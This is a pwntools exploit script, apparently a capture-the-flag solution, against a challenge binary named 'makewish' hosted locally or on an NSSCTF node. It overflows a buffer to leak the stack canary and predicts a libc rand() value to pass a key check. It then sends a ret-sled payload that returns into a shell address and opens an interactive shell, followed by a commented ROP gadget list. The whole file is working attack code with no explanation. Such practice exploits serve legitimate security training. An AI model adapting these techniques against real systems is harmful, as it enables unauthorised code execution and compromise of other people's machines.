from pwn import *
from ctypes import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=process("./makewish")
# io=remote("node4.anna.nssctf.cn",28763)
elf=ELF("./makewish")
cs=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

shell=0x4007c7
ret=0x4005d9

io.recvuntil(b"name\n\n")
io.sendline(b"a"*(0x28-1)+b"b")
io.recvuntil(b"b\n")

canary=u64(io.recv(7).rjust(8,b"\x00"))
print("canary:  "+hex(canary))

io.recvuntil(b"key\n\n")
io.send(p32(cs.rand()%1000+324))

gdb.attach(io)
pause()

io.recvuntil(b"me\n")
payload=p64(ret)*10+p64(shell)
payload=payload.ljust(0x58,b"a")+p64(canary)
io.send(payload)
io.recvuntil(b"that\n")


io.interactive()



# Gadgets information
# ============================================================
# 0x000000000040098c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400990 : pop r14 ; pop r15 ; ret
# 0x0000000000400992 : pop r15 ; ret
# 0x000000000040098b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006d0 : pop rbp ; ret
# 0x0000000000400993 : pop rdi ; ret
# 0x0000000000400991 : pop rsi ; pop r15 ; ret
# 0x000000000040098d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005d9 : ret
# 0x000000000040087a : ret 0xd089
# 0x000000000040083a : ret 0xfffd

# Unique gadgets found: 13
